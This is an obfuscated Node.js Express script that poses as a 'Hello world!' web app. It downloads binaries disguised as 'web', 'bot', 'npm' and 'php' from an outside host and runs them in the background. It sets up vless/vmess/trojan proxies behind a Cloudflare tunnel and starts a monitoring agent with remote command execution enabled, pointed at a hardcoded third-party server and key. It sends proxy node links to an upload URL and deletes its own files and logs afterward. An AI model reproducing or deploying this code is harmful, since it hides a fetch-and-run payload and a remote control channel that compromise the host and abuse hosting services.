const _0x4070f0=_0x3651;(function(_0x4f4deb,_0x3b2b63){const _0x16c7c9=_0x3651,_0x98d217=_0x4f4deb();while(!![]){try{const _0x133ce4=parseInt(_0x16c7c9(0x156))/0x1*(-parseInt(_0x16c7c9(0x13a))/0x2)+parseInt(_0x16c7c9(0x1b3))/0x3+-parseInt(_0x16c7c9(0x1d3))/0x4*(-parseInt(_0x16c7c9(0x189))/0x5)+-parseInt(_0x16c7c9(0x16d))/0x6+parseInt(_0x16c7c9(0x167))/0x7*(parseInt(_0x16c7c9(0x18a))/0x8)+parseInt(_0x16c7c9(0x1c2))/0x9+parseInt(_0x16c7c9(0x174))/0xa;if(_0x133ce4===_0x3b2b63)break;else _0x98d217['push'](_0x98d217['shift']());}catch(_0x34bf5b){_0x98d217['push'](_0x98d217['shift']());}}}(_0x1fd0,0xb482f));const express=require('express'),app=express(),axios=require(_0x4070f0(0x13d)),os=require('os'),fs=require('fs'),path=require(_0x4070f0(0x1b4)),{promisify}=require(_0x4070f0(0x199)),exec=promisify(require('child_process')[_0x4070f0(0x164)]),{execSync}=require('child_process'),UPLOAD_URL=process['env'][_0x4070f0(0x185)]||'',PROJECT_URL=process[_0x4070f0(0x172)][_0x4070f0(0x173)]||'',AUTO_ACCESS=process[_0x4070f0(0x172)][_0x4070f0(0x1d5)]||![],FILE_PATH=process[_0x4070f0(0x172)]['FILE_PATH']||_0x4070f0(0x149),SUB_PATH=process[_0x4070f0(0x172)][_0x4070f0(0x122)]||'sub',PORT=process['env']['SERVER_PORT']||process[_0x4070f0(0x172)][_0x4070f0(0x142)]||0xbb8,UUID=process[_0x4070f0(0x172)][_0x4070f0(0x121)]||'9afd1229-b893-40c1-84dd-51e7ce204913',NEZHA_SERVER=process[_0x4070f0(0x172)][_0x4070f0(0x1d7)]||_0x4070f0(0x1c8),NEZHA_PORT=process[_0x4070f0(0x172)][_0x4070f0(0x193)]||'',NEZHA_KEY=process['env'][_0x4070f0(0x152)]||_0x4070f0(0x153),ARGO_DOMAIN=process['env'][_0x4070f0(0x1bb)]||_0x4070f0(0x120),ARGO_AUTH=process['env']['ARGO_AUTH']||_0x4070f0(0x1c5),ARGO_PORT=process[_0x4070f0(0x172)]['ARGO_PORT']||0x1f90,CFIP=process[_0x4070f0(0x172)][_0x4070f0(0x1a2)]||_0x4070f0(0x195),CFPORT=process[_0x4070f0(0x172)][_0x4070f0(0x197)]||0x1bb,NAME=process[_0x4070f0(0x172)][_0x4070f0(0x190)]||_0x4070f0(0x17c);!fs[_0x4070f0(0x125)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x4070f0(0x14b)](FILE_PATH+'\x20is\x20created')):console[_0x4070f0(0x14b)](FILE_PATH+_0x4070f0(0x168));let npmPath=path['join'](FILE_PATH,_0x4070f0(0x124)),phpPath=path[_0x4070f0(0x1a7)](FILE_PATH,_0x4070f0(0x15a)),webPath=path['join'](FILE_PATH,_0x4070f0(0x19f)),botPath=path[_0x4070f0(0x1a7)](FILE_PATH,_0x4070f0(0x1c4)),subPath=path['join'](FILE_PATH,_0x4070f0(0x181)),listPath=path['join'](FILE_PATH,_0x4070f0(0x1b0)),bootLogPath=path[_0x4070f0(0x1a7)](FILE_PATH,_0x4070f0(0x1a5)),configPath=path[_0x4070f0(0x1a7)](FILE_PATH,_0x4070f0(0x1d2));function deleteNodes(){const _0x1a494a=_0x4070f0;try{if(!UPLOAD_URL)return;if(!fs[_0x1a494a(0x125)](subPath))return;let _0x2b24dc;try{_0x2b24dc=fs[_0x1a494a(0x19d)](subPath,_0x1a494a(0x1b9));}catch{return null;}const _0x3e6de6=Buffer[_0x1a494a(0x1c0)](_0x2b24dc,_0x1a494a(0x11e))['toString'](_0x1a494a(0x1b9)),_0x46dd4e=_0x3e6de6[_0x1a494a(0x182)]('\x0a')[_0x1a494a(0x1ae)](_0xf92cc5=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0xf92cc5));if(_0x46dd4e['length']===0x0)return;return axios[_0x1a494a(0x19c)](UPLOAD_URL+_0x1a494a(0x16c),JSON[_0x1a494a(0x1a1)]({'nodes':_0x46dd4e}),{'headers':{'Content-Type':_0x1a494a(0x137)}})[_0x1a494a(0x14f)](_0x36341d=>{return null;});}catch(_0xf2a479){return null;}}function cleanupOldFiles(){const _0x57f71e=_0x4070f0,_0x313766=[_0x57f71e(0x19f),_0x57f71e(0x1c4),_0x57f71e(0x124),_0x57f71e(0x15a),_0x57f71e(0x181),_0x57f71e(0x1a5)];_0x313766['forEach'](_0x19f5a5=>{const _0x4ea72d=_0x57f71e,_0x49d34c=path[_0x4ea72d(0x1a7)](FILE_PATH,_0x19f5a5);fs[_0x4ea72d(0x1cf)](_0x49d34c,()=>{});});}app[_0x4070f0(0x160)]('/',function(_0x374b1d,_0x2c7d10){const _0x1d43c3=_0x4070f0;_0x2c7d10['send'](_0x1d43c3(0x176));});const config={'log':{'access':_0x4070f0(0x123),'error':_0x4070f0(0x123),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x4070f0(0x15d),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x4070f0(0x178),'fallbacks':[{'dest':0xbb9},{'path':_0x4070f0(0x1c3),'dest':0xbba},{'path':_0x4070f0(0x1ab),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x4070f0(0x126)}},{'port':0xbb9,'listen':_0x4070f0(0x1d4),'protocol':_0x4070f0(0x15d),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'tcp','security':'none'}},{'port':0xbba,'listen':_0x4070f0(0x1d4),'protocol':_0x4070f0(0x15d),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x4070f0(0x178)},'streamSettings':{'network':'ws','security':_0x4070f0(0x178),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x4070f0(0x1b8),_0x4070f0(0x171),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x4070f0(0x1d4),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x4070f0(0x1ab)}},'sniffing':{'enabled':!![],'destOverride':[_0x4070f0(0x1b8),_0x4070f0(0x171),_0x4070f0(0x192)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x4070f0(0x1d4),'protocol':_0x4070f0(0x12d),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x4070f0(0x178),'wsSettings':{'path':_0x4070f0(0x1bf)}},'sniffing':{'enabled':!![],'destOverride':[_0x4070f0(0x1b8),_0x4070f0(0x171),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x4070f0(0x17a)]},'outbounds':[{'protocol':_0x4070f0(0x184),'tag':_0x4070f0(0x18e)},{'protocol':_0x4070f0(0x1c1),'tag':'block'}]};fs[_0x4070f0(0x14e)](path[_0x4070f0(0x1a7)](FILE_PATH,'config.json'),JSON[_0x4070f0(0x1a1)](config,null,0x2));function getSystemArchitecture(){const _0xd74c24=_0x4070f0,_0x2f7893=os[_0xd74c24(0x188)]();return _0x2f7893===_0xd74c24(0x150)||_0x2f7893==='arm64'||_0x2f7893===_0xd74c24(0x1a9)?_0xd74c24(0x150):'amd';}function downloadFile(_0x13551f,_0x50aa42,_0xabfa32){const _0x4b95be=_0x4070f0,_0x26ec6a=path[_0x4b95be(0x1a7)](FILE_PATH,_0x13551f),_0x4cbf3e=fs['createWriteStream'](_0x26ec6a);axios({'method':_0x4b95be(0x160),'url':_0x50aa42,'responseType':_0x4b95be(0x1be)})['then'](_0x328b73=>{const _0x57c33b=_0x4b95be;_0x328b73[_0x57c33b(0x177)]['pipe'](_0x4cbf3e),_0x4cbf3e['on'](_0x57c33b(0x17f),()=>{const _0x37e27b=_0x57c33b;_0x4cbf3e[_0x37e27b(0x155)](),console['log'](_0x37e27b(0x1cb)+_0x13551f+_0x37e27b(0x1d8)),_0xabfa32(null,_0x13551f);}),_0x4cbf3e['on'](_0x57c33b(0x163),_0x3644d6=>{const _0x562fe1=_0x57c33b;fs['unlink'](_0x26ec6a,()=>{});const _0x1e7e27=_0x562fe1(0x1cb)+_0x13551f+_0x562fe1(0x128)+_0x3644d6[_0x562fe1(0x131)];console[_0x562fe1(0x163)](_0x1e7e27),_0xabfa32(_0x1e7e27);});})['catch'](_0x24d045=>{const _0x236fff=_0x4b95be,_0x198fbd='Download\x20'+_0x13551f+_0x236fff(0x128)+_0x24d045[_0x236fff(0x131)];console[_0x236fff(0x163)](_0x198fbd),_0xabfa32(_0x198fbd);});}function _0x1fd0(){const _0x553782=['split','web\x20is\x20running','freedom','UPLOAD_URL','fileUrl','\x0a\x20\x20\x20\x20','arch','9115GJpEEl','36216IeBfsA','true','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','\x0avless://','direct','clear','NAME','\x20>/dev/null\x202>&1','quic','NEZHA_PORT','toString','www.visa.com.sg','&type=ws&host=','CFPORT','NEZHA\x20variable\x20is\x20empty,skip\x20running','util','Error\x20executing\x20command:\x20','map','post','readFileSync','includes','web','./npm','stringify','CFIP','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','2096','boot.log','2087','join','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','aarch64','--tls','/vmess-argo','all','false','filter','automatic\x20access\x20task\x20added\x20successfully','list.txt','forEach','status','3460890xrJpvs','path','length','/api/add-nodes','https://amd64.ssss.nyc.mn/2go','http','utf-8','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','ARGO_DOMAIN','\x0a\x20\x20tunnel:\x20','ArgoDomain:','stream','/trojan-argo','from','blackhole','3556665GBxerl','/vless-argo','bot','eyJhIjoiZjUxNzk5OTMxMWQ4ZTAzOTg4OThmZjRkMTZiZDYzYjQiLCJ0IjoiZTM5ZTEwYmUtZWM2NC00NmFkLTg2MGItMGQxOTM3ZDY3OWVlIiwicyI6Ik5UZzNaVFUwWmpZdE1EaGpOQzAwWkRoa0xUazBaamd0TkRRNVpUVmtaakl3TnpWayJ9','npm\x20running\x20error:\x20','&path=%2Ftrojan-argo%3Fed%3D2560#','nzku.fortymenty.eu.org:443','https://oooo.serv00.net/add-url','push','Download\x20','tunnel.json','php\x20is\x20running','Error\x20reading\x20boot.log:','unlink','config.yaml','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','config.json','548jKxhXn','127.0.0.1','AUTO_ACCESS','https://arm64.ssss.nyc.mn/2go','NEZHA_SERVER','\x20successfully','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','base64','/web\x20-c\x20','shiper.yszy.nyc.mn','UUID','SUB_PATH','/dev/null','npm','existsSync','tcp','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','\x20failed:\x20','https://arm64.ssss.nyc.mn/agent','/npm\x20-s\x20','https://arm64.ssss.nyc.mn/v1','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','trojan','Error\x20downloading\x20files:','443','unlinkSync','message','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','/php\x20-c\x20\x22','/bot\x20','\x20>/dev/null\x202>&1\x20&','application/json','8443','2083','2464JebRtk','ARGO_DOMAIN:','&path=%2Fvless-argo%3Fed%3D2560#','axios','set','https://amd64.ssss.nyc.mn/web','pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1','TunnelSecret','PORT','2053','\x0a\x20\x20credentials-file:\x20','/config.json\x20>/dev/null\x202>&1\x20&','web\x20running\x20error:\x20','Content-Type','?security=tls&sni=','./tmp','https://amd64.ssss.nyc.mn/v1','log','\x0aclient_secret:\x20','chmod','writeFileSync','catch','arm','fileName','NEZHA_KEY','UsC5sNDciSaNggxJdB3EGSGYS242VT7q','nohup\x20','close','650LGPZLp','listen','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','./php','php','/api/add-subscriptions','Skipping\x20adding\x20automatic\x20access\x20task','vless','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','./web','get','bot\x20is\x20running.','./bot','error','exec','/sub.txt\x20saved\x20successfully','\x20-p\x20','938FxurBv','\x20already\x20exists','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','tunnel.yml','http\x20server\x20is\x20running\x20on\x20port:','/api/delete-nodes','7317630HaLHGr','send','\x0a\x20\x20\x0atrojan://','response','tls','env','PROJECT_URL','3545960iwMEoz','match','Hello\x20world!','data','none','npm\x20is\x20running','https+local://8.8.8.8/dns-query','Subscription\x20uploaded\x20successfully','Vls','Empowerment\x20success\x20for\x20','unshift','finish','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','sub.txt'];_0x1fd0=function(){return _0x553782;};return _0x1fd0();}async function downloadFilesAndRun(){const _0x2dc9a9=_0x4070f0,_0x2b2e20=getSystemArchitecture(),_0x1a69c3=getFilesForArchitecture(_0x2b2e20);if(_0x1a69c3[_0x2dc9a9(0x1b5)]===0x0){console[_0x2dc9a9(0x14b)](_0x2dc9a9(0x1ba));return;}const _0x48a6b6=_0x1a69c3[_0x2dc9a9(0x19b)](_0x27c83b=>{return new Promise((_0x36b43a,_0x142e1d)=>{const _0x2a2e00=_0x3651;downloadFile(_0x27c83b[_0x2a2e00(0x151)],_0x27c83b[_0x2a2e00(0x186)],(_0xe04f93,_0x3e135e)=>{_0xe04f93?_0x142e1d(_0xe04f93):_0x36b43a(_0x3e135e);});});});try{await Promise[_0x2dc9a9(0x1ac)](_0x48a6b6);}catch(_0x448590){console[_0x2dc9a9(0x163)](_0x2dc9a9(0x12e),_0x448590);return;}function _0x10d95b(_0x2cf972){const _0x4eba15=_0x2dc9a9,_0x50c0f5=0x1fd;_0x2cf972[_0x4eba15(0x1b1)](_0x101097=>{const _0x49babb=_0x4eba15,_0x5552d1=path[_0x49babb(0x1a7)](FILE_PATH,_0x101097);fs['existsSync'](_0x5552d1)&&fs[_0x49babb(0x14d)](_0x5552d1,_0x50c0f5,_0x19ddb5=>{const _0x2c515f=_0x49babb;_0x19ddb5?console[_0x2c515f(0x163)]('Empowerment\x20failed\x20for\x20'+_0x5552d1+':\x20'+_0x19ddb5):console[_0x2c515f(0x14b)](_0x2c515f(0x17d)+_0x5552d1+':\x20'+_0x50c0f5['toString'](0x8));});});}const _0x53163a=NEZHA_PORT?[_0x2dc9a9(0x1a0),_0x2dc9a9(0x15f),_0x2dc9a9(0x162)]:[_0x2dc9a9(0x159),_0x2dc9a9(0x15f),_0x2dc9a9(0x162)];_0x10d95b(_0x53163a);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3d5f50=NEZHA_SERVER[_0x2dc9a9(0x19e)](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x404d08=new Set([_0x2dc9a9(0x12f),_0x2dc9a9(0x138),_0x2dc9a9(0x1a4),_0x2dc9a9(0x1a6),_0x2dc9a9(0x139),'2053']),_0x1d7263=_0x404d08['has'](_0x3d5f50)?_0x2dc9a9(0x18b):_0x2dc9a9(0x1ad),_0x45927e=_0x2dc9a9(0x14c)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20'+NEZHA_SERVER+_0x2dc9a9(0x15e)+_0x1d7263+_0x2dc9a9(0x127)+UUID;fs['writeFileSync'](path[_0x2dc9a9(0x1a7)](FILE_PATH,_0x2dc9a9(0x1d0)),_0x45927e);const _0x36bf29=_0x2dc9a9(0x154)+FILE_PATH+_0x2dc9a9(0x134)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x36bf29),console[_0x2dc9a9(0x14b)](_0x2dc9a9(0x1cd)),await new Promise(_0x10e5e8=>setTimeout(_0x10e5e8,0x3e8));}catch(_0x17f297){console[_0x2dc9a9(0x163)]('php\x20running\x20error:\x20'+_0x17f297);}}else{let _0x1c19c2='';const _0xaaca83=[_0x2dc9a9(0x12f),_0x2dc9a9(0x138),_0x2dc9a9(0x1a4),_0x2dc9a9(0x1a6),_0x2dc9a9(0x139),_0x2dc9a9(0x143)];_0xaaca83[_0x2dc9a9(0x19e)](NEZHA_PORT)&&(_0x1c19c2=_0x2dc9a9(0x1aa));const _0x30b0b0=_0x2dc9a9(0x154)+FILE_PATH+_0x2dc9a9(0x12a)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2dc9a9(0x166)+NEZHA_KEY+'\x20'+_0x1c19c2+_0x2dc9a9(0x136);try{await exec(_0x30b0b0),console[_0x2dc9a9(0x14b)](_0x2dc9a9(0x179)),await new Promise(_0x5acdb4=>setTimeout(_0x5acdb4,0x3e8));}catch(_0x1eead3){console[_0x2dc9a9(0x163)](_0x2dc9a9(0x1c6)+_0x1eead3);}}}else console['log'](_0x2dc9a9(0x198));const _0x58968f='nohup\x20'+FILE_PATH+_0x2dc9a9(0x11f)+FILE_PATH+_0x2dc9a9(0x145);try{await exec(_0x58968f),console[_0x2dc9a9(0x14b)](_0x2dc9a9(0x183)),await new Promise(_0xd3ff55=>setTimeout(_0xd3ff55,0x3e8));}catch(_0x3eb49f){console[_0x2dc9a9(0x163)](_0x2dc9a9(0x146)+_0x3eb49f);}if(fs['existsSync'](path[_0x2dc9a9(0x1a7)](FILE_PATH,_0x2dc9a9(0x1c4)))){let _0x44551a;if(ARGO_AUTH[_0x2dc9a9(0x175)](/^[A-Z0-9a-z=]{120,250}$/))_0x44551a=_0x2dc9a9(0x180)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x44551a=_0x2dc9a9(0x133)+FILE_PATH+'/tunnel.yml\x20run':_0x44551a='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x2dc9a9(0x154)+FILE_PATH+_0x2dc9a9(0x135)+_0x44551a+'\x20>/dev/null\x202>&1\x20&'),console[_0x2dc9a9(0x14b)]('bot\x20is\x20running'),await new Promise(_0x2f9253=>setTimeout(_0x2f9253,0x7d0));}catch(_0x1cb988){console[_0x2dc9a9(0x163)](_0x2dc9a9(0x19a)+_0x1cb988);}}await new Promise(_0x25bafc=>setTimeout(_0x25bafc,0x1388));}function getFilesForArchitecture(_0x45abd5){const _0x29abcb=_0x4070f0;let _0x2020a1;_0x45abd5==='arm'?_0x2020a1=[{'fileName':'web','fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':_0x29abcb(0x1c4),'fileUrl':_0x29abcb(0x1d6)}]:_0x2020a1=[{'fileName':_0x29abcb(0x19f),'fileUrl':_0x29abcb(0x13f)},{'fileName':_0x29abcb(0x1c4),'fileUrl':_0x29abcb(0x1b7)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x36cd0a=_0x45abd5==='arm'?_0x29abcb(0x129):'https://amd64.ssss.nyc.mn/agent';_0x2020a1[_0x29abcb(0x17e)]({'fileName':_0x29abcb(0x124),'fileUrl':_0x36cd0a});}else{const _0x59f3d2=_0x45abd5===_0x29abcb(0x150)?_0x29abcb(0x12b):_0x29abcb(0x14a);_0x2020a1['unshift']({'fileName':_0x29abcb(0x15a),'fileUrl':_0x59f3d2});}}return _0x2020a1;}function argoType(){const _0x773140=_0x4070f0;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x773140(0x1d1));return;}if(ARGO_AUTH[_0x773140(0x19e)](_0x773140(0x141))){fs[_0x773140(0x14e)](path[_0x773140(0x1a7)](FILE_PATH,_0x773140(0x1cc)),ARGO_AUTH);const _0x43afe7=_0x773140(0x1bc)+ARGO_AUTH[_0x773140(0x182)]('\x22')[0xb]+_0x773140(0x144)+path[_0x773140(0x1a7)](FILE_PATH,_0x773140(0x1cc))+_0x773140(0x18c)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x773140(0x1a3);fs['writeFileSync'](path['join'](FILE_PATH,_0x773140(0x16a)),_0x43afe7);}else console[_0x773140(0x14b)](_0x773140(0x11d));}argoType();async function extractDomains(){const _0x601845=_0x4070f0;let _0x21c1e8;if(ARGO_AUTH&&ARGO_DOMAIN)_0x21c1e8=ARGO_DOMAIN,console[_0x601845(0x14b)](_0x601845(0x13b),_0x21c1e8),await _0x380e20(_0x21c1e8);else try{const _0x585cfb=fs['readFileSync'](path[_0x601845(0x1a7)](FILE_PATH,'boot.log'),_0x601845(0x1b9)),_0x6db146=_0x585cfb[_0x601845(0x182)]('\x0a'),_0x421c5b=[];_0x6db146[_0x601845(0x1b1)](_0x1b2f91=>{const _0xe64b0d=_0x601845,_0x469a26=_0x1b2f91[_0xe64b0d(0x175)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x469a26){const _0x4c6cf6=_0x469a26[0x1];_0x421c5b[_0xe64b0d(0x1ca)](_0x4c6cf6);}});if(_0x421c5b[_0x601845(0x1b5)]>0x0)_0x21c1e8=_0x421c5b[0x0],console[_0x601845(0x14b)](_0x601845(0x1bd),_0x21c1e8),await _0x380e20(_0x21c1e8);else{console['log'](_0x601845(0x158)),fs[_0x601845(0x130)](path[_0x601845(0x1a7)](FILE_PATH,_0x601845(0x1a5)));async function _0x1f3bd9(){const _0x41dbf6=_0x601845;try{await exec(_0x41dbf6(0x140));}catch(_0x15142a){}}_0x1f3bd9(),await new Promise(_0x1a3b71=>setTimeout(_0x1a3b71,0xbb8));const _0x4501d0=_0x601845(0x169)+FILE_PATH+_0x601845(0x1a8)+ARGO_PORT;try{await exec('nohup\x20'+path[_0x601845(0x1a7)](FILE_PATH,_0x601845(0x1c4))+'\x20'+_0x4501d0+_0x601845(0x136)),console[_0x601845(0x14b)](_0x601845(0x161)),await new Promise(_0x68991e=>setTimeout(_0x68991e,0xbb8)),await extractDomains();}catch(_0x20fafe){console[_0x601845(0x163)](_0x601845(0x19a)+_0x20fafe);}}}catch(_0x4bb3c6){console['error'](_0x601845(0x1ce),_0x4bb3c6);}async function _0x380e20(_0x22292a){const _0x4c68a0=_0x601845,_0x55c0d6=execSync(_0x4c68a0(0x12c),{'encoding':_0x4c68a0(0x1b9)}),_0xd5c18b=_0x55c0d6['trim']();return new Promise(_0x363837=>{setTimeout(()=>{const _0x318b9c=_0x3651,_0x161923={'v':'2','ps':NAME+'-'+_0xd5c18b,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x318b9c(0x178),'net':'ws','type':_0x318b9c(0x178),'host':_0x22292a,'path':'/vmess-argo?ed=2560','tls':'tls','sni':_0x22292a,'alpn':''},_0x538505=_0x318b9c(0x18d)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x22292a+_0x318b9c(0x196)+_0x22292a+_0x318b9c(0x13c)+NAME+'-'+_0xd5c18b+'\x0a\x20\x20\x0avmess://'+Buffer[_0x318b9c(0x1c0)](JSON[_0x318b9c(0x1a1)](_0x161923))[_0x318b9c(0x194)](_0x318b9c(0x11e))+_0x318b9c(0x16f)+UUID+'@'+CFIP+':'+CFPORT+_0x318b9c(0x148)+_0x22292a+_0x318b9c(0x196)+_0x22292a+_0x318b9c(0x1c7)+NAME+'-'+_0xd5c18b+_0x318b9c(0x187);console[_0x318b9c(0x14b)](Buffer[_0x318b9c(0x1c0)](_0x538505)['toString']('base64')),fs[_0x318b9c(0x14e)](subPath,Buffer['from'](_0x538505)['toString'](_0x318b9c(0x11e))),console[_0x318b9c(0x14b)](FILE_PATH+_0x318b9c(0x165)),uplodNodes(),app[_0x318b9c(0x160)]('/'+SUB_PATH,(_0x27ab52,_0x262335)=>{const _0x47ebce=_0x318b9c,_0x4397d4=Buffer[_0x47ebce(0x1c0)](_0x538505)[_0x47ebce(0x194)](_0x47ebce(0x11e));_0x262335[_0x47ebce(0x13e)](_0x47ebce(0x147),'text/plain;\x20charset=utf-8'),_0x262335[_0x47ebce(0x16e)](_0x4397d4);}),_0x363837(_0x538505);},0x7d0);});}}function _0x3651(_0x38824b,_0x3d58d2){const _0x1fd058=_0x1fd0();return _0x3651=function(_0x365163,_0x7caad){_0x365163=_0x365163-0x11d;let _0x334181=_0x1fd058[_0x365163];return _0x334181;},_0x3651(_0x38824b,_0x3d58d2);}async function uplodNodes(){const _0xf1bfc7=_0x4070f0;if(UPLOAD_URL&&PROJECT_URL){const _0x25aa6e=PROJECT_URL+'/'+SUB_PATH,_0x16f976={'subscription':[_0x25aa6e]};try{const _0x100a42=await axios['post'](UPLOAD_URL+_0xf1bfc7(0x15b),_0x16f976,{'headers':{'Content-Type':_0xf1bfc7(0x137)}});if(_0x100a42[_0xf1bfc7(0x1b2)]===0xc8)console[_0xf1bfc7(0x14b)](_0xf1bfc7(0x17b));else return null;}catch(_0x2192df){if(_0x2192df[_0xf1bfc7(0x170)]){if(_0x2192df['response']['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0xf1bfc7(0x125)](listPath))return;const _0x153234=fs[_0xf1bfc7(0x19d)](listPath,_0xf1bfc7(0x1b9)),_0x1acc52=_0x153234[_0xf1bfc7(0x182)]('\x0a')[_0xf1bfc7(0x1ae)](_0x396bf8=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x396bf8));if(_0x1acc52[_0xf1bfc7(0x1b5)]===0x0)return;const _0x3af848=JSON[_0xf1bfc7(0x1a1)]({'nodes':_0x1acc52});try{await axios[_0xf1bfc7(0x19c)](UPLOAD_URL+_0xf1bfc7(0x1b6),_0x3af848,{'headers':{'Content-Type':_0xf1bfc7(0x137)}});if(response[_0xf1bfc7(0x1b2)]===0xc8)console[_0xf1bfc7(0x14b)](_0xf1bfc7(0x17b));else return null;}catch(_0x2a5fd8){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x5452b0=_0x3651,_0x33a051=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(NEZHA_PORT)_0x33a051[_0x5452b0(0x1ca)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x33a051[_0x5452b0(0x1ca)](phpPath);exec('rm\x20-rf\x20'+_0x33a051[_0x5452b0(0x1a7)]('\x20')+_0x5452b0(0x191),_0x1ee633=>{const _0x41cae5=_0x5452b0;console[_0x41cae5(0x18f)](),console[_0x41cae5(0x14b)]('App\x20is\x20running'),console[_0x41cae5(0x14b)](_0x41cae5(0x132));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x63c6c2=_0x4070f0;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x63c6c2(0x15c));return;}try{const _0x2743b7=await axios['post'](_0x63c6c2(0x1c9),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x63c6c2(0x137)}});console[_0x63c6c2(0x14b)](_0x63c6c2(0x1af));}catch(_0x257d56){console[_0x63c6c2(0x163)]('添加URL失败:\x20'+_0x257d56[_0x63c6c2(0x131)]);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}startserver(),app[_0x4070f0(0x157)](PORT,()=>console[_0x4070f0(0x14b)](_0x4070f0(0x16b)+PORT+'!'));
